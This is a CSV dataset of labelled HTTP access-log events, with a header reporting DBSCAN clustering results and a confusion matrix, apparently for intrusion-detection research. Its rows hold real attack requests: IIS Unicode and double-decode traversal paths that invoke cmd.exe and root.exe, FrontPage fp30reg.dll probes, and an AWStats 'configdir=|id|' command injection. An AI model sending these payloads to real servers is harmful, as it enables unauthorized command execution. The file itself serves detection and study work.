#------------------------------------------------------------------------------------------------------------
#  ~ DateTime: 2020-05-29 16:54:53
#  ~ Dataframe name: "http_access_log"
#  ~ Number of events in the dataframe: 3554
#  ~ Number of unique labels ('label_event_type') in the dataframe: 12
#  ~ Selected features set for the clustering: ['HTTP_method', 'ClientRequestLine@', 'StatusCode', 'ObjectSize~', 'Referrer~', 'Agent@']
#  ~ The dataframe was scaled using the scaler: MinMaxScaler
#  ~ Parameters:  EPS=0.10286568826994683  MinPts=2 (The EPS parameter was calculated in 0.006379 seconds)
#  ~ The DBSCAN clustering process was performed in 0.193605 seconds
#  ~ Results summary: (20 Clus. | 5 Outl. | Homg.: 99.93% | Comp.: 93.22% | V-measure: 96.46% | AR: 97.24% | AMI: 93.13%)
#
#  ~ Details of clusters:
#       Cluster [0] contains 484 items. MV:["AE0"]. Details:{'AE': 484}
#       Cluster [1] contains 979 items. MV:["AA1"]. Details:{'AA': 979}
#       Cluster [2] contains 109 items. MV:["AB2"]. Details:{'AB': 109}
#       Cluster [3] contains 86 items. MV:["AE3"]. Details:{'AE': 86}
#       Cluster [4] contains 587 items. MV:["AC4"]. Details:{'AC': 587}
#       Cluster [5] contains 23 items. MV:["AD5"]. Details:{'AD': 23}
#       Cluster [6] contains 14 items. MV:["AD6"]. Details:{'AD': 14}
#       Cluster [7] contains 3 items. MV:["AC7"]. Details:{'AC': 3}
#       Cluster [8] contains 46 items. MV:["AI8"]. Details:{'AI': 46}
#       Cluster [9] contains 100 items. MV:["AH9"]. Details:{'AH': 100}
#       Cluster [10] contains 125 items. MV:["AF10"]. Details:{'AF': 125}
#       Cluster [11] contains 16 items. MV:["AD11"]. Details:{'AD': 16}
#       Cluster [12] contains 32 items. MV:["AH12"]. Details:{'AH': 32}
#       Cluster [13] contains 769 items. MV:["AJ13"]. Details:{'AJ': 769}
#       Cluster [14] contains 14 items. MV:["AK14"]. Details:{'AK': 14}
#       Cluster [15] contains 54 items. MV:["AK15"]. Details:{'AE': 1, 'AK': 53}
#       Cluster [16] contains 5 items. MV:["AD16"]. Details:{'AD': 5}
#       Cluster [17] contains 57 items. MV:["AL17"]. Details:{'AL': 57}
#       Cluster [18] contains 23 items. MV:["AG18"]. Details:{'AG': 23}
#       Cluster [19] contains 23 items. MV:["AK19"]. Details:{'AK': 23}
#
#  ~ Details of outliers: {'AC': 1, 'AD': 1, 'AE': 3}
#
#  ~ Confusion matrix:
#     +--------+-----------------------------------------------------------------------------------+
#     | Actual +                                    Predicted                                      |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |        |  AA  |  AB  |  AC  |  AD  |  AE  |  AF  |  AG  |  AH  |  AI  |  AJ  |  AK  |  AL  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |   AA   | 979  |      |      |      |      |      |      |      |      |      |      |      |
#     |   AB   |      | 109  |      |      |      |      |      |      |      |      |      |      |
#     |   AC   |      |      | 590  |      |      |      |      |      |      |      |      |      |
#     |   AD   |      |      |      |  58  |      |      |      |      |      |      |      |      |
#     |   AE   |      |      |      |      | 570  |      |      |      |      |      |  1   |      |
#     |   AF   |      |      |      |      |      | 125  |      |      |      |      |      |      |
#     |   AG   |      |      |      |      |      |      |  23  |      |      |      |      |      |
#     |   AH   |      |      |      |      |      |      |      | 132  |      |      |      |      |
#     |   AI   |      |      |      |      |      |      |      |      |  46  |      |      |      |
#     |   AJ   |      |      |      |      |      |      |      |      |      | 769  |      |      |
#     |   AK   |      |      |      |      |      |      |      |      |      |      |  90  |      |
#     |   AL   |      |      |      |      |      |      |      |      |      |      |      |  57  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#
#  ~ Note: to import this file into Python, use: "DF = pandas.read_csv(file_name, sep=',', comment='#')"
#
#------------------------------------------------------------------------------------------------------------
DateTime~,Http_protocol@,ObjectSize~,Agent@,HTTP_method,ClientRequestLine@,StatusCode,ClientIP$,Referrer~,label_event_type~,label_IPpair_ID~,phase1_predicted_label~
1110703569,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110703598,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110703641,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110703661,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110703682,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110703706,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110703727,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110703748,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110703776,"HTTP/1.1",1060,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110703798,"HTTP/1.1",1059,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110703819,"HTTP/1.1",1060,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110703872,"HTTP/1.1",1060,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110703967,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110704012,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110704059,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110704111,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110704160,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9210116059164,"-","AC","S122","A_4"
1110704238,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9211141115145,"-","AE","S137","A_0"
1110718227,"HTTP/1.1",1050,"-","GET","/scripts/nsiislog.dll","'404'",9066030071074,"-","AA","S482","A_1"
1110727391,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727391,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727391,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727391,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727391,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727391,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727391,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727392,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727392,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727392,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727392,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727392,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727392,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727393,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727393,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727393,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727393,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727394,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727394,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727394,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110727394,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.yahoo.com/","'403'",9218001111050,"-","AF","S181","A_10"
1110730138,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9066131126031,"-","AE","S466","A_0"
1110731339,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9069158007209,"-","AE","S539","A_0"
1110736353,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9213129021137,"-","AE","S161","A_0"
1110738914,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9024023244160,"-","AA","S336","A_1"
1110738916,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9024023244160,"-","AA","S336","A_1"
1110738918,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9024023244160,"-","AA","S336","A_1"
1110738920,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9024023244160,"-","AA","S336","A_1"
1110738922,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9024023244160,"-","AA","S336","A_1"
1110738924,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9024023244160,"-","AA","S336","A_1"
1110738926,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9024023244160,"-","AA","S336","A_1"
1110738928,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9024023244160,"-","AA","S336","A_1"
1110738929,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9024023244160,"-","AA","S336","A_1"
1110738931,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9024023244160,"-","AA","S336","A_1"
1110738932,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9024023244160,"-","AA","S336","A_1"
1110738935,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9024023244160,"-","AA","S336","A_1"
1110738936,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9024023244160,"-","AB","S336","A_2"
1110738938,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9024023244160,"-","AB","S336","A_2"
1110738940,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9024023244160,"-","AA","S336","A_1"
1110738942,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9024023244160,"-","AA","S336","A_1"
1110743384,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9024130169087,"-","AE","S329","A_0"
1110746887,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9221237066208,"-","AE","S285","A_0"
1110752566,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9208046133177,"-","AE","S111","A_0"
1110754371,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218088202208,"-","AE","S232","A_0"
1110755665,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9219186156026,"-","AE","S250","A_0"
1110762192,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9065202033226,"-","AE","S461","A_0"
1110766318,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9208039169124,"-","AE","S110","A_0"
1110769125,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769125,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769125,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769126,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769126,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769126,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769126,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769126,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769126,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769126,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769127,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769127,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769127,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769127,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769127,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769127,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769127,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769127,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769127,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769127,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769127,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769128,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110769128,"HTTP/1.1",308,"-","GET","/","'400'",9220110029027,"-","AB","S256","A_2"
1110770731,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9061205006071,"-","AE","S404","A_0"
1110776072,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9068191137235,"-","AE","S517","A_0"
1110785741,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9157091044001,"-","AE","S23","A_0"
1110790686,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9209213220227,"-","AE","S120","A_0"
1110792834,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218201121099,"-","AE","S194","A_0"
1110800425,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9222166160063,"-","AE","S310","A_0"
1110807055,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9066021127198,"-","AE","S479","A_0"
1110814043,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9024185027145,"-","AE","S332","A_0"
1110815980,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9069246007031,"-","AA","S547","A_1"
1110815980,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9069246007031,"-","AA","S547","A_1"
1110815980,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9069246007031,"-","AA","S547","A_1"
1110815981,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9069246007031,"-","AA","S547","A_1"
1110815981,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069246007031,"-","AA","S547","A_1"
1110815981,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069246007031,"-","AA","S547","A_1"
1110815982,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069246007031,"-","AA","S547","A_1"
1110815982,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9069246007031,"-","AA","S547","A_1"
1110815982,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9069246007031,"-","AA","S547","A_1"
1110815982,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9069246007031,"-","AA","S547","A_1"
1110815982,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9069246007031,"-","AA","S547","A_1"
1110815983,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9069246007031,"-","AA","S547","A_1"
1110815983,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9069246007031,"-","AB","S547","A_2"
1110815983,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9069246007031,"-","AB","S547","A_2"
1110815983,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9069246007031,"-","AA","S547","A_1"
1110815983,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9069246007031,"-","AA","S547","A_1"
1110826656,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9067170000153,"-","AA","S501","A_1"
1110826657,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9067170000153,"-","AA","S501","A_1"
1110826657,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9067170000153,"-","AA","S501","A_1"
1110826657,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9067170000153,"-","AA","S501","A_1"
1110826658,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9067170000153,"-","AA","S501","A_1"
1110826661,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9067170000153,"-","AA","S501","A_1"
1110826662,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9067170000153,"-","AA","S501","A_1"
1110826662,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9067170000153,"-","AA","S501","A_1"
1110826663,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9067170000153,"-","AA","S501","A_1"
1110826663,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9067170000153,"-","AA","S501","A_1"
1110826663,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9067170000153,"-","AA","S501","A_1"
1110826664,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9067170000153,"-","AA","S501","A_1"
1110826664,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9067170000153,"-","AB","S501","A_2"
1110826664,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9067170000153,"-","AB","S501","A_2"
1110826664,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9067170000153,"-","AA","S501","A_1"
1110826665,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9067170000153,"-","AA","S501","A_1"
1110830437,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9222166160003,"-","AE","S304","A_0"
1110833292,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9061010007140,"-","AE","S366","A_0"
1110837087,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9061232252176,"-","AE","S409","A_0"
1110854151,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9219133025250,"-","AE","S238","A_0"
1110854262,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9139068004004,"-","AE","S15","A_0"
1110856956,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9204102106103,"-","AE","S93","A_0"
1110867108,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9061010007068,"-","AE","S379","A_0"
1110867332,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9067136086162,"-","AE","S495","A_0"
1110868403,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9157091048191,"-","AE","S24","A_0"
1110874059,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9067154159190,"-","AE","S497","A_0"
1110880429,"HTTP/1.1",1050,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9081181146013,"-","AJ","S570","A_13"
1110880429,"HTTP/1.1",1050,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9081181146013,"-","AJ","S570","A_13"
1110880430,"HTTP/1.1",1050,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9081181146013,"-","AJ","S570","A_13"
1110880430,"HTTP/1.1",1050,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9081181146013,"-","AJ","S570","A_13"
1110880431,"HTTP/1.1",1050,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9081181146013,"-","AJ","S570","A_13"
1110880432,"HTTP/1.1",1051,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9081181146013,"-","AJ","S570","A_13"
1110880432,"HTTP/1.1",1050,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9081181146013,"-","AJ","S570","A_13"
1110880432,"HTTP/1.1",1050,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9081181146013,"-","AJ","S570","A_13"
1110880433,"HTTP/1.1",1050,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9081181146013,"-","AJ","S570","A_13"
1110880433,"HTTP/1.1",1051,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9081181146013,"-","AJ","S570","A_13"
1110880432,"HTTP/1.1",1050,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9081181146013,"-","AJ","S570","A_13"
1110880433,"HTTP/1.1",1051,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9081181146013,"-","AJ","S570","A_13"
1110880432,"HTTP/1.1",1051,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9081181146013,"-","AJ","S570","A_13"
1110880433,"HTTP/1.1",1097,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","'500'",9081181146013,"-","AL","S570","A_17"
